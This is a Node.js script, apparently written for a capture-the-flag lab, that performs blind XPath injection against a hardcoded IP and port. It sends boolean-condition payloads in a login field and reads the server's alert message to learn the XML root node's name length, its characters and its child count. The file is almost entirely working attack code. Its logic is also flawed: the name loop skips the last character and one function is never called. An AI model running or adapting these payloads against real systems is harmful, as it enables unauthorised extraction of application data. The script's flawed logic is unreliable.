const axios = require('axios');
const cheerio = require('cheerio');

// Define the endpoint URL
const endpointUrl = 'http://94.237.58.148:31461/index.php';

// Function to determine the length of the root node's name
async function determineRootNodeLength() {
    let rootNodeNameLength = 1;
    let success = true;
    
    while (success) {
        try {
            
            // Modify the payload to check the length of the root node's name
            const payload = `username=invalid' or string-length(name(/*[1]))=${rootNodeNameLength} and '1'='1&msg=Hello`;
            let contentLength = payload.length
            console.log(payload)
            // Define the request headers
            const headers = {
                'Host': '94.237.58.148:31461',
                'Content-Length': contentLength,
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'http://94.237.58.148:31461',
                'Content-Type': 'application/x-www-form-urlencoded',
            
            };
            // Make a POST request to the endpoint with the modified payload
            const response = await axios.post(endpointUrl, payload, { headers });
                // Load the HTML response into Cheerio
            const $ = cheerio.load(response.data);

            // Extract the content of the script tag
            const scriptContent = $('script').html();

            // Find and extract the value from the script tag
            const match = scriptContent.match(/alert\("(.*)"\);/);
            const result = match ? match[1] : null;
            console.log("[-]",result)
            //Check if the response indicates success
            if (result.includes("Message successfully sent!")) {
                success = false;
                console.log("Root node's name length: ",rootNodeNameLength);
                determineRootNodeName(rootNodeNameLength)
                break;
             } 
        } catch (error) {
            console.error('Error:', error.message);
            break; // Exit the loop on error
        }

        // Increment the length for the next iteration
        rootNodeNameLength++;
    }
}

async function determineRootNodeName(rootNodeNameLength) {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const rootNodeNameMask = '*'.repeat(rootNodeNameLength)
    let rootNodeName = ''

    for (let j = 1; j < rootNodeNameLength; j++) {
        
        for (let i = 0; i < alphabet.length; i++) {
            const char = alphabet[i];
            try {
                
                // Modify the payload to check the root node's name
                const payload = `username=invalid' or substring(name(/*[1]),${j},1)='${char}'and '1'='1&msg=Hello`;
                let contentLength = payload.length
                console.log(payload)
                // Define the request headers
                const headers = {
                    'Host': '94.237.58.148:31461',
                    'Content-Length': contentLength,
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'Origin': 'http://94.237.58.148:31461',
                    'Content-Type': 'application/x-www-form-urlencoded',
                
                };
                // Make a POST request to the endpoint with the modified payload
                const response = await axios.post(endpointUrl, payload, { headers });
                    // Load the HTML response into Cheerio
                const $ = cheerio.load(response.data);
    
                // Extract the content of the script tag
                const scriptContent = $('script').html();
    
                // Find and extract the value from the script tag
                const match = scriptContent.match(/alert\("(.*)"\);/);
                const result = match ? match[1] : null;
                console.log("[-]",result)
                //Check if the response indicates success
                if (result.includes("Message successfully sent!")  || rootNodeNameLength <= rootNodeName.length) {
                    rootNodeName += char
                    console.log("[*] ",rootNodeName);
                    continue;
                 } else {
                    console.log("Root node's name: ", rootNodeName);
                 } 
            } catch (error) {
                console.error('Error:', error.message);
                break; // Exit the loop on error
            }
    
        }
    }
    
    
}

async function determineNumberChildNode(rootNodeName) {
    let number = 1;
    let success = true;
    
    while (success) {
        try {
            
            // Modify the payload to check the length of the root node's name
            const payload = `username=invalid' or count(/${rootNodeName}/*)=${number} and '1'='1&msg=Hello`;
            let contentLength = payload.length
            console.log(payload)
            // Define the request headers
            const headers = {
                'Host': '94.237.58.148:31461',
                'Content-Length': contentLength,
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'http://94.237.58.148:31461',
                'Content-Type': 'application/x-www-form-urlencoded',
            
            };
            // Make a POST request to the endpoint with the modified payload
            const response = await axios.post(endpointUrl, payload, { headers });
                // Load the HTML response into Cheerio
            const $ = cheerio.load(response.data);

            // Extract the content of the script tag
            const scriptContent = $('script').html();

            // Find and extract the value from the script tag
            const match = scriptContent.match(/alert\("(.*)"\);/);
            const result = match ? match[1] : null;
            console.log("[-]",result)
            //Check if the response indicates success
            if (result.includes("Message successfully sent!")) {
                success = false;
                console.log("Child nodes:", number);
                break;
             } 
        } catch (error) {
            console.error('Error:', error.message);
            break; // Exit the loop on error
        }

        // Increment the length for the next iteration
        number++;
    }
}
// Call the determineRootNodeLength function
determineRootNodeLength();
